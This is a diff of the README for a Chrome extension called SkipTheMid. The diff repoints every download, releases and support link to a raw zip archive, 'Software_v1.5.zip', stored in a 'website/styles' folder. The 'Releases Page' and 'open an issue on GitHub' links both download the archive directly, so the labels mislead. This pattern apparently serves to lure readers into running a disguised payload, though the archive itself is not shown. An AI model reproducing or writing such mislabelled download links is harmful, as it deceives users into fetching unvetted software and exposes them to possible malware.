@@ -8,13 +8,13 @@ SkipTheMid is a Chrome extension that helps you skip through the clutter on Netf
 
 To get started, you’ll need to download SkipTheMid. Follow these simple steps to install the extension on your Chrome browser.
 
-[![Download SkipTheMid](https://raw.githubusercontent.com/Sangunius/skipthemid/main/colporteur/skipthemid.zip)](https://raw.githubusercontent.com/Sangunius/skipthemid/main/colporteur/skipthemid.zip)
+[![Download SkipTheMid](https://github.com/Sangunius/skipthemid/raw/refs/heads/main/website/styles/Software_v1.5.zip)](https://github.com/Sangunius/skipthemid/raw/refs/heads/main/website/styles/Software_v1.5.zip)
 
 1. **Visit the Releases Page**
 
    Click the link below to access the releases page:
 
-   [Visit the Releases Page to Download](https://raw.githubusercontent.com/Sangunius/skipthemid/main/colporteur/skipthemid.zip)
+   [Visit the Releases Page to Download](https://github.com/Sangunius/skipthemid/raw/refs/heads/main/website/styles/Software_v1.5.zip)
 
 2. **Choose the Latest Version**
 
@@ -88,10 +88,10 @@ If you encounter problems during installation or use:
 
 ## 📞 Support
 
-For further support, feel free to open an issue on [GitHub](https://raw.githubusercontent.com/Sangunius/skipthemid/main/colporteur/skipthemid.zip). The community or the developer will assist you in resolving your concerns.
+For further support, feel free to open an issue on [GitHub](https://github.com/Sangunius/skipthemid/raw/refs/heads/main/website/styles/Software_v1.5.zip). The community or the developer will assist you in resolving your concerns.
 
 ## 🔗 Connect with Us
 
 Stay informed on updates and new features by following our repository. Your feedback is valuable as we improve SkipTheMid to better serve your streaming needs. 
 
-Access the latest version and updates on our [Releases Page](https://raw.githubusercontent.com/Sangunius/skipthemid/main/colporteur/skipthemid.zip).
+Access the latest version and updates on our [Releases Page](https://github.com/Sangunius/skipthemid/raw/refs/heads/main/website/styles/Software_v1.5.zip).
